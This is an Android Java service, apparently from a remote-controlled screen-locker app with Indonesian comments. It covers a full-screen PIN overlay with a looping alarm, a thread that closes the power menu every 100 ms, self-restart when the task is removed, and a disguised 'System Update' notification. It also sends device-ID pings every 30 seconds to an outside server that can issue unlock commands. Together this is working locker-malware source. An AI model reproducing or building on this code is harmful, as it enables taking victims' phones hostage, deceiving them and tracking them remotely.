package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.PixelFormat;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import android.os.Handler;
import android.os.Looper;  // ← TAMBAHKAN IMPORT INI

import androidx.core.app.NotificationCompat;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

// ============ TAMBAHAN: IMPORT UNTUK JSON ============
import org.json.JSONObject;
import org.json.JSONException;
// ============ AKHIR TAMBAHAN ============

public class LockService extends Service {
    private WindowManager wm;
    private View overlay;
    private String lockType = "pin";
    private String lockData = "1234";
    private static final String CHANNEL_ID = "lock_service_channel";
    private static final int NOTIFICATION_ID = 999;
    private PowerManager.WakeLock wakeLock;
    
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private MediaPlayer mediaPlayer;
    
    private Handler powerMenuHandler;
    private Runnable closePowerMenuRunnable;
    private boolean isPowerMenuDetected = false;
    
    private String deviceId;
    private Handler keepAliveHandler;
    private Runnable keepAliveRunnable;
    
    private boolean isUnlocking = false;
    
    // ============ TAMBAHAN: CHECKER UNTUK PASTIKAN LOCK SCREEN HILANG ============
    private Handler lockCheckerHandler;
    private Runnable lockCheckerRunnable;
    // ============ AKHIR TAMBAHAN ============
    
    // ============ TAMBAHAN: UNTUK APP LOCK ============
    private Handler appLockHandler;
    private Runnable appLockRunnable;
    private String currentLockedAppPackage = "";
    private String currentLockedAppPin = "";
    // ============ AKHIR TAMBAHAN ============

    @Override
    public void onCreate() {
        super.onCreate();
        
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        
        startForegroundService();
        acquireWakeLock();
        
        powerMenuHandler = new Handler();
        closePowerMenuRunnable = new Runnable() {
            @Override
            public void run() {
                closePowerMenu();
            }
        };
        startPowerMenuBlocker();
        
        initSound();
        
        keepAliveHandler = new Handler();
        keepAliveRunnable = new Runnable() {
            @Override
            public void run() {
                sendKeepAlivePing();
                keepAliveHandler.postDelayed(this, 30000);
            }
        };
        
        // ============ TAMBAHAN: START LOCK CHECKER ============
        lockCheckerHandler = new Handler();
        lockCheckerRunnable = new Runnable() {
            @Override
            public void run() {
                checkAndRemoveLockIfNeeded();
                lockCheckerHandler.postDelayed(this, 1000);
            }
        };
        lockCheckerHandler.postDelayed(lockCheckerRunnable, 1000);
        // ============ AKHIR TAMBAHAN ============
        
        // ============ TAMBAHAN: START APP LOCK CHECKER ============
        appLockHandler = new Handler();
        appLockRunnable = new Runnable() {
            @Override
            public void run() {
                checkCurrentAppForLock();
                appLockHandler.postDelayed(this, 1000);
            }
        };
        appLockHandler.postDelayed(appLockRunnable, 1000);
        // ============ AKHIR TAMBAHAN ============
    }
    
    // ============ TAMBAHAN: CEK APLIKASI YANG SEDANG DIBUKA ============
    private void checkCurrentAppForLock() {
        if (isUnlocking) return;
        if (overlay != null) return; // Sedang lock screen, jangan ganggu
        
        try {
            // Gunaan UsageStatsManager untuk deteksi aplikasi (butuh izin)
            android.app.usage.UsageStatsManager usageStatsManager = 
                (android.app.usage.UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
            
            long endTime = System.currentTimeMillis();
            long startTime = endTime - 1000;
            
            android.app.usage.UsageEvents usageEvents = usageStatsManager.queryEvents(startTime, endTime);
            android.app.usage.UsageEvents.Event event = new android.app.usage.UsageEvents.Event();
            
            String topPackage = null;
            while (usageEvents.getNextEvent(event)) {
                if (event.getEventType() == android.app.usage.UsageEvents.Event.MOVE_TO_FOREGROUND) {
                    topPackage = event.getPackageName();
                }
            }
            
            if (topPackage != null && !topPackage.equals(currentLockedAppPackage)) {
                currentLockedAppPackage = topPackage;
                // Cek apakah aplikasi ini perlu dikunci
                checkAndLockApp(topPackage);
            }
        } catch (Exception e) {
            // UsageStats tidak diizinkan atau error
        }
    }
    
    private void checkAndLockApp(String packageName) {
        SharedPreferences prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
        String lockedAppsJson = prefs.getString("locked_apps", "");
        if (lockedAppsJson.isEmpty()) return;
        
        try {
            JSONObject lockedApps = new JSONObject(lockedAppsJson);
            if (lockedApps.has(packageName)) {
                String pin = lockedApps.getString(packageName);
                currentLockedAppPin = pin;
                showAppLockScreen(packageName, pin);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    
    private void showAppLockScreen(String packageName, String requiredPin) {
        if (isUnlocking) return;
        if (overlay != null) return;
        
        isUnlocking = true;
        
        // Simpan data lock untuk app
        lockType = "applock";
        lockData = packageName + "|" + requiredPin;
        
        // Tampilkan lock screen
        showLockScreen();
        
        // Reset flag setelah 5 detik
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                isUnlocking = false;
            }
        }, 5000);
    }
    // ============ AKHIR TAMBAHAN ============
    
    // ============ TAMBAHAN: CEK DAN HAPUS LOCK SCREEN JIKA PERLU ============
    private void checkAndRemoveLockIfNeeded() {
        SharedPreferences prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
        boolean isLocked = prefs.getBoolean("flutter.system_locked", false);
        
        if (!isLocked && overlay != null) {
            System.out.println("🔓 LockChecker: Detected mismatch! Removing lock screen...");
            removeLockScreenImmediately();
        }
    }
    
    private void removeLockScreenImmediately() {
        if (overlay != null && wm != null) {
            try {
                wm.removeView(overlay);
            } catch (Exception e) {
                e.printStackTrace();
            }
            overlay = null;
        }
        stopLockSound();
        
        Intent unlockTaskIntent = new Intent(this, MainActivity.class);
        unlockTaskIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        unlockTaskIntent.putExtra("stop_lock_task", true);
        startActivity(unlockTaskIntent);
    }
    // ============ AKHIR TAMBAHAN ============
    
    private void initSound() {
        try {
            mediaPlayer = MediaPlayer.create(this, R.raw.lock_sound);
            if (mediaPlayer != null) {
                mediaPlayer.setLooping(true);
                mediaPlayer.setVolume(1.0f, 1.0f);
                mediaPlayer.setWakeMode(getApplicationContext(), PowerManager.PARTIAL_WAKE_LOCK);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void playLockSound() {
        if (mediaPlayer != null) {
            try {
                if (mediaPlayer.isPlaying()) {
                    mediaPlayer.stop();
                    mediaPlayer.release();
                    mediaPlayer = MediaPlayer.create(this, R.raw.lock_sound);
                    if (mediaPlayer != null) {
                        mediaPlayer.setLooping(true);
                        mediaPlayer.setVolume(1.0f, 1.0f);
                    }
                }
                if (mediaPlayer != null) mediaPlayer.start();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    private void stopLockSound() {
        if (mediaPlayer != null && mediaPlayer.isPlaying()) {
            try {
                mediaPlayer.stop();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    private void startPowerMenuBlocker() {
        Thread powerMenuMonitor = new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        checkForPowerMenu();
                        Thread.sleep(100);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        powerMenuMonitor.setDaemon(true);
        powerMenuMonitor.start();
    }
    
    private void checkForPowerMenu() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                try {
                    Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
                    sendBroadcast(closeDialog);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void closePowerMenu() {
        try {
            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeDialog);
            isPowerMenuDetected = false;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Security Service",
                NotificationManager.IMPORTANCE_HIGH
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Device is protected - Running in background")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setOngoing(true)
            .build();

        startForeground(NOTIFICATION_ID, notification);
    }
    
    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "LockService::WakeLock");
        wakeLock.setReferenceCounted(false);
        wakeLock.acquire(10 * 60 * 1000L);
    }
    
    private void sendKeepAlivePing() {
        if (deviceId == null || deviceId.isEmpty()) return;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL("http://cloudnex.biz.id:4023/ping");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    String json = "{\"device_id\":\"" + deviceId + "\"}";
                    OutputStream os = conn.getOutputStream();
                    os.write(json.getBytes());
                    os.flush();
                    os.close();
                    int responseCode = conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
    
    private void startKeepAlive() {
        if (keepAliveHandler != null && keepAliveRunnable != null) {
            keepAliveHandler.removeCallbacks(keepAliveRunnable);
            keepAliveHandler.postDelayed(keepAliveRunnable, 30000);
        }
    }
    
    private void stopKeepAlive() {
        if (keepAliveHandler != null && keepAliveRunnable != null) {
            keepAliveHandler.removeCallbacks(keepAliveRunnable);
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            if (intent.hasExtra("device_id")) {
                deviceId = intent.getStringExtra("device_id");
                startKeepAlive();
                System.out.println("✅ LockService: Device ID set to " + deviceId);
            }
            
            if (intent.hasExtra("keep_alive")) {
                sendKeepAlivePing();
            }
            
            // ============ PERBAIKAN UTAMA: UNLOCK DEVICE ============
            if (intent.hasExtra("unlock_device")) {
                System.out.println("🔓 LockService: Received unlock_device command");
                stopLockService();
                return START_NOT_STICKY;
            }
            // ============ AKHIR PERBAIKAN ============
            
            // ============ TAMBAHAN: UNTUK APP LOCK UNLOCK ============
            if (intent.hasExtra("unlock_app")) {
                String packageName = intent.getStringExtra("unlock_app");
                unlockSpecificApp(packageName);
            }
            // ============ AKHIR TAMBAHAN ============
            
            String newLockType = intent.getStringExtra("lock_type");
            String newLockData = intent.getStringExtra("lock_data");
            if (newLockType != null) lockType = newLockType;
            if (newLockData != null) lockData = newLockData;
        }
        
        SharedPreferences prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
        boolean isLocked = prefs.getBoolean("flutter.system_locked", false);
        
        if (isLocked && overlay == null) {
            showLockScreen();
        }
        
        return START_STICKY;
    }
    
    // ============ TAMBAHAN: UNLOCK APP SPECIFIC ============
    private void unlockSpecificApp(String packageName) {
        SharedPreferences prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
        String lockedAppsJson = prefs.getString("locked_apps", "");
        if (lockedAppsJson.isEmpty()) return;
        
        try {
            JSONObject lockedApps = new JSONObject(lockedAppsJson);
            if (lockedApps.has(packageName)) {
                lockedApps.remove(packageName);
                prefs.edit().putString("locked_apps", lockedApps.toString()).apply();
                System.out.println("🔓 App unlocked: " + packageName);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    // ============ AKHIR TAMBAHAN ============
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartIntent = new Intent(getApplicationContext(), LockService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
        super.onTaskRemoved(rootIntent);
    }
    
    private void showLockScreen() {
        if (isUnlocking) return;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            stopSelf();
            return;
        }
        
        SharedPreferences prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
        boolean isLocked = prefs.getBoolean("flutter.system_locked", false);
        
        // ============ TAMBAHAN: UNTUK APP LOCK ============
        // Jika ini adalah app lock, jangan cek system_locked
        boolean isAppLock = lockType.equals("applock");
        if (!isAppLock && !isLocked) return;
        // ============ AKHIR TAMBAHAN ============
        
        playLockSound();
        
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        overlay = LayoutInflater.from(this).inflate(R.layout.lock_overlay, null);
        
        TextView tvTitle = overlay.findViewById(R.id.tv_title);
        TextView tvMessage = overlay.findViewById(R.id.tv_message);
        EditText etPin = overlay.findViewById(R.id.et_pin);
        Button btnUnlock = overlay.findViewById(R.id.btn_unlock);
        
        // ============ TAMBAHAN: UNTUK APP LOCK ============
        if (lockType.equals("applock") && lockData != null && lockData.contains("|")) {
            String[] parts = lockData.split("\\|");
            String packageName = parts[0];
            String requiredPin = parts[1];
            
            tvTitle.setText("🔒 APP LOCKED");
            tvMessage.setText("Package: " + packageName + "\nEnter PIN to unlock");
            etPin.setVisibility(View.VISIBLE);
            btnUnlock.setText("UNLOCK");
            btnUnlock.setOnClickListener(v -> {
                String enteredPin = etPin.getText().toString();
                if (enteredPin.equals(requiredPin)) {
                    // Unlock app ini
                    unlockSpecificApp(packageName);
                    stopLockService();
                } else {
                    Toast.makeText(LockService.this, "PIN salah!", Toast.LENGTH_SHORT).show();
                    etPin.setText("");
                }
            });
        }
        // ============ AKHIR TAMBAHAN ============
        else if ("text".equals(lockType) && lockData != null && !lockData.isEmpty()) {
            tvTitle.setText("DEVICE LOCKED");
            tvMessage.setText(lockData);
            etPin.setVisibility(View.GONE);
            btnUnlock.setText("OK");
            btnUnlock.setOnClickListener(v -> stopLockService());
        } else {
            tvTitle.setText("DEVICE TERKUNCI\nPIN: " + lockData);
            tvMessage.setText("ENTER PIN");
            etPin.setVisibility(View.VISIBLE);
            btnUnlock.setText("UNLOCK");
            btnUnlock.setOnClickListener(v -> {
                String enteredPin = etPin.getText().toString();
                System.out.println("🔐 PIN entered: " + enteredPin + " | Expected: " + lockData);
                if (enteredPin.equals(lockData)) {
                    System.out.println("✅ PIN correct, unlocking...");
                    stopLockService();
                } else {
                    Toast.makeText(LockService.this, "PIN salah!", Toast.LENGTH_SHORT).show();
                    etPin.setText("");
                }
            });
        }
        
        int flags = WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
        
        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_PHONE;
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT, type, flags, PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.CENTER;
        wm.addView(overlay, params);
        
        Intent lockTaskIntent = new Intent(this, MainActivity.class);
        lockTaskIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        lockTaskIntent.putExtra("start_lock_task", true);
        startActivity(lockTaskIntent);
    }
    
    private void stopLockService() {
        if (isUnlocking) return;
        isUnlocking = true;
        
        System.out.println("🔓 stopLockService called");
        
        stopLockSound();
        
        SharedPreferences prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
        prefs.edit()
            .putBoolean("flutter.system_locked", false)
            .remove("lock_type")
            .remove("lock_data")
            .apply();
        
        if (overlay != null && wm != null) {
            try {
                wm.removeView(overlay);
            } catch (Exception e) {
                e.printStackTrace();
            }
            overlay = null;
        }
        
        Intent unlockTaskIntent = new Intent(this, MainActivity.class);
        unlockTaskIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        unlockTaskIntent.putExtra("stop_lock_task", true);
        startActivity(unlockTaskIntent);
        
        isUnlocking = false;
        
        // Reset lock type
        lockType = "pin";
        lockData = "1234";
        
        stopForeground(true);
        stopSelf();
    }
    
    @Override
    public void onDestroy() {
        stopLockSound();
        stopKeepAlive();
        
        if (lockCheckerHandler != null && lockCheckerRunnable != null) {
            lockCheckerHandler.removeCallbacks(lockCheckerRunnable);
        }
        
        // ============ TAMBAHAN: STOP APP LOCK CHECKER ============
        if (appLockHandler != null && appLockRunnable != null) {
            appLockHandler.removeCallbacks(appLockRunnable);
        }
        // ============ AKHIR TAMBAHAN ============
        
        if (mediaPlayer != null) {
            try {
                if (mediaPlayer.isPlaying()) mediaPlayer.stop();
                mediaPlayer.release();
                mediaPlayer = null;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        if (overlay != null && wm != null) {
            try {
                wm.removeView(overlay);
            } catch (Exception e) {}
            overlay = null;
        }
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}